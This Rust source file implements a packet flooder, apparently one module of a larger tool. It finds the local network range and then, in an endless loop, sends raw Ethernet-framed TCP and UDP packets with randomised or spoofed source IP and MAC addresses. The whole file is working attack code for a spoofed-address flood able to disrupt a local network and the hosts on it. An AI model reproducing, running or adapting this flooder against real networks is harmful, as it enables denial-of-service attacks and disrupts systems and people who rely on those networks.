use std::net::Ipv4Addr;
use crate::arg_parser::FloodArgs;
use crate::generators::{Ipv4Iter, RandValues};
use crate::iface::IfaceInfo;
use crate::pkt_builder::PacketBuilder;
use crate::sockets::Layer2RawSocket;
use crate::utils::inline_display;



pub struct PacketFlooder {
    args:      FloodArgs,
    start:     u32,
    end:       u32,
    pkts_sent: usize,
    rng:       RandValues,
}



impl PacketFlooder {

    pub fn new(args: FloodArgs) -> Self {
        Self {
            args,
            start:     0,
            end:       0,
            pkts_sent: 0,
            rng:       RandValues::new(),
        }
    }



    pub fn execute(&mut self){
        self.set_ip_range();
        self.send_endlessly();
    }



    fn set_ip_range(&mut self) {
        let cidr         = IfaceInfo::iface_network_cidr(&self.args.iface);
        let mut ip_range = Ipv4Iter::new(&cidr, None, None);
        let first_ip     = ip_range.next().expect("No IPs in range");
        let last_ip      = Ipv4Addr::from(u32::from(first_ip) + ip_range.total() as u32 - 3);
        self.start       = first_ip.into();
        self.end         = last_ip.into();
    }



    fn setup_tools(iface: &str) -> (PacketBuilder, Layer2RawSocket) {
        let pkt_builder = PacketBuilder::new();
        let pkt_sender  = Layer2RawSocket::new(&iface);
        (pkt_builder, pkt_sender)
    }



    fn send_endlessly(&mut self) {
        let (mut pkt_builder, pkt_sender) = Self::setup_tools(&self.args.iface);

        let fixed_src_ip  = self.args.src_ip;
        let fixed_src_mac = self.args.src_mac;
        let fixed_dst_ip  = self.args.dst_ip;
        let fixed_dst_mac = self.args.dst_mac;

        loop {
            let src_ip   = fixed_src_ip.unwrap_or_else(|| self.rng.get_random_ip(self.start, self.end));
            let src_mac  = fixed_src_mac.unwrap_or_else(|| self.rng.get_random_mac());
            let src_port = self.rng.get_random_port();
            let dst_ip   = fixed_dst_ip.unwrap_or_else(|| self.rng.get_random_ip(self.start, self.end));
            let dst_mac  = fixed_dst_mac.unwrap_or_else(|| self.rng.get_random_mac());
            
            let tcp_pkt = pkt_builder.tcp_ether(src_mac, src_ip, src_port, dst_mac, dst_ip, 53);
            pkt_sender.send(tcp_pkt);

            let udp_pkt = pkt_builder.udp_ether(src_mac, src_ip, src_port, dst_mac, dst_ip, 80);
            pkt_sender.send(udp_pkt);
            
            self.display_progress();
        }
    }

    

    fn display_progress(&mut self) {
        self.pkts_sent += 2;
        let msg: String = format!("Packets sent: {}", &self.pkts_sent);
        inline_display(msg);
    }

}